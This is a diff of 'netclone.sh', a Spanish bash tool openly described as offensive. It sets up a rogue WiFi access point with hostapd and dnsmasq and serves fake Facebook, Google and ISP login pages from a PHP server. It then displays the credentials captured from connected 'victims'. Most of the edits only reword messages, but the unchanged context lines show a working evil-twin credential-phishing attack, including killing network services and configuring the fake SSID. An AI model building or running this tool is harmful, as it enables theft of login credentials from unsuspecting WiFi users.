@@ -42,28 +42,27 @@ function banner(){
 function helpPanel(){
     echo -e "\n${purpleColour}[*]${endColour}${grayColour} Uso: ./netclone.sh${endColour}"
     echo -e "\n\t${purpleColour}m)${endColour}${grayColour} Modo (terminal o gui)${endColour}"
-    echo -e "\n\t${purpleColour}h)${endColour}${grayColour} Mostrar este panel de ayuda${endColour}\n"
     exit 0
 }
 
 function dependencies(){
 	sleep 1.5; counter=0
-	echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
+	echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour}Verificando programas requeridos...\n"
 	sleep 1
 
     dependencias=(php dnsmasq hostapd)
 
     for programa in "${dependencias[@]}"; do
         if [ "$(command -v $programa)" ]; then
-            echo -e ". . . . . . . . ${darkPurpleColour}[V]${endColour}${grayColour} La herramienta${endColour}${purpleColour} $programa${endColour}${grayColour} está instalada"
+            echo -e ". . . . . . . . ${darkPurpleColour}[V]${endColour}${grayColour} La herramienta${endColour}${purpleColour} $programa${endColour}${grayColour} Está instalada."
             let counter+=1
         else
-            echo -e "${purpleColour}[X]${endColour}${grayColour} La herramienta${endColour}${purpleColour} $programa${endColour}${grayColour} no está instalada"
+            echo -e "${purpleColour}[X]${endColour}${grayColour} La herramienta${endColour}${purpleColour} $programa${endColour}${grayColour} No está instalada."
         fi; sleep 0.4
     done
 
     if [ "$counter" == "3" ]; then
-        echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour} Comenzando...\n"
+        echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour} Iniciando...\n"
         sleep 3
     else
         echo -e "\n${purpleColour}[!]${endColour}${grayColour} Necesitas tener instaladas php, dnsmasq y hostapd para ejecutar este script${endColour}\n"
@@ -74,7 +73,7 @@ function dependencies(){
 function getCredentials(){
 	activeHosts=0
 	tput civis; while true; do
-		echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${purpleColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
+		echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour} Esperando credenciales... (${endColour}${purpleColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 		for i in $(seq 1 60); do echo -ne "${purpleColour}-"; done && echo -e "${endColour}"
 		echo -e "${purpleColour}Víctimas conectadas: ${endColour}${darkPurpleColour}$activeHosts${endColour}\n"
 		find \-name datos-privados.txt | xargs cat 2>/dev/null
@@ -98,19 +97,19 @@ function startAttack(){
 		let counter++
 	done; tput cnorm
 	checker=0; while [ $checker -ne 1 ]; do
-		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface
+		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (ejemplo: wlan0mon): ${endColour}" && read choosed_interface
 
 		for interface in $(cat iface); do
 			if [ "$choosed_interface" == "$interface" ]; then
 				checker=1
 			fi
-		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
+		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz ingresada no existe.${endColour}"; fi
 	done
 
 	rm iface 2>/dev/null
-	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: WifiGratis):${endColour} " && read -r use_ssid
+	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (ejemplo: WifiGratis)::${endColour} " && read -r use_ssid
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
-	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
+	echo -e "\n${redColour}[!] Terminando todas las conexiones...${endColour}\n"
 	sleep 2
 	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 	sleep 5
@@ -124,7 +123,7 @@ function startAttack(){
 	echo -e "auth_algs=1\n" >> hostapd.conf
 	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
 
-	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
+	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz... $choosed_interface${endColour}\n"
 	sleep 2
 	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
 	hostapd hostapd.conf > /dev/null 2>&1 &
@@ -154,7 +153,7 @@ function startAttack(){
     optimumwifi 
     )
 
-	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
+	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${blueColour} El uso de esta herramienta es bajo tu responsabilidad.${endColour}\n\n"
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, optimumwifi):${endColour} " && read template
 
 	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
@@ -165,12 +164,11 @@ function startAttack(){
 
 	if [ $check_plantillas -eq 1 ]; then
 		tput civis; pushd $template > /dev/null 2>&1
-		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+		echo -e "\n${blueColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
 		php -S 192.168.1.1:80 > /dev/null 2>&1 &
 		sleep 2
 		popd > /dev/null 2>&1; getCredentials
 	else
-		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
 		pushd $template > /dev/null 2>&1
 		php -S 192.168.1.1:80 > /dev/null 2>&1 &
@@ -180,8 +178,8 @@ function startAttack(){
 }
 
 function guiMode(){
-	whiptail --title "NetClone - by Bons18" --msgbox "Bienvenido a NetClone, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 8 78
-	whiptail --title "NetClone - by Bons18" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "Bienvenido a NetClone, una herramienta ofensiva para desplegar un Rogue AP a medida." 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "Verificando requisitos antes de iniciar..." 8 78
 
 	tput civis; dependencias=(php dnsmasq hostapd)
 
@@ -192,10 +190,10 @@ function guiMode(){
     done
 
     if [ $counter_dep -eq "3" ]; then
-		whiptail --title "NetClone - by Bons18" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
+		whiptail --title "NetClone - by Bons18" --msgbox "Todo en orden, tienes lo necesario." 8 78
 		tput civis
     else
-		whiptail --title "NetClone - by Bons18" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
+		whiptail --title "NetClone - by Bons18" --msgbox "Faltan dependencias: instala PHP, Dnsmasq y Hostapd." 8 78
         exit 1
     fi
 
@@ -203,7 +201,7 @@ function guiMode(){
         rm -rf credenciales.txt
     fi
 
-	whiptail --title "NetClone - by Bons18" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "Listando interfaces de red disponibles. Selecciona una que acepte el modo monitor." 8 78
 
 	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
     counter=1; for interface in $(cat iface); do
@@ -215,7 +213,7 @@ function guiMode(){
             if [ "$choosed_interface" == "$interface" ]; then
                 checker=1
             fi
-        done; if [ $checker -eq 0 ]; then whiptail --title "NetClone - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
+        done; if [ $checker -eq 0 ]; then whiptail --title "NetClone - Error en la selección de interfaz" --msgbox "La interfaz ingresada no existe. Verifica y vuelve a intentarlo." 8 78; fi
     done
 
 	tput civis; whiptail --title "NetClone - by Bons18" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
@@ -240,9 +238,9 @@ function guiMode(){
 
 	use_channel=$(cat use_channel | tr -d '"'); rm use_channel
 
-	whiptail --title "NetClone - by Bons18" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "Perfecto, generando archivos de configuración para el ataque..." 8 78
 
-	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... (Este proceso tarda unos segundos)${endColour}"
+	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... Por favor, espera unos segundos.${endColour}"
     sleep 2
     killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
     sleep 5
@@ -280,9 +278,9 @@ function guiMode(){
     # Array de plantillas
     plantillas=(facebook-login google-login optimumwifi)
 
-	whiptail --title "NetClone - by Bons18" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "¡Listo! Ahora elige tu plantilla." 8 78
 
-    whiptail --title "NetClone - by Bons18" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
+    whiptail --title "NetClone - by Bons18" --checklist --separate-output "Selecciona la plantilla que quieres usar." 20 103 12 \
     facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
     google-login "Plantilla de inicio de sesión de Google" OFF \
     optimumwifi "Plantilla de inicio de sesión para el uso de WiFi (Selección de ISP)" OFF \
@@ -299,7 +297,7 @@ function guiMode(){
     clear
 
     if [ $check_plantillas -eq 1 ]; then
-		whiptail --title "NetClone - by Bons18" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
+		whiptail --title "NetClone - by Bons18" --msgbox "¡Todo listo! En breve, el punto de acceso estará activo. Ahora, solo queda esperar a que las víctimas se conecten." 8 78
         tput civis; pushd $template > /dev/null 2>&1
         php -S 192.168.1.1:80 > /dev/null 2>&1 &
         sleep 2
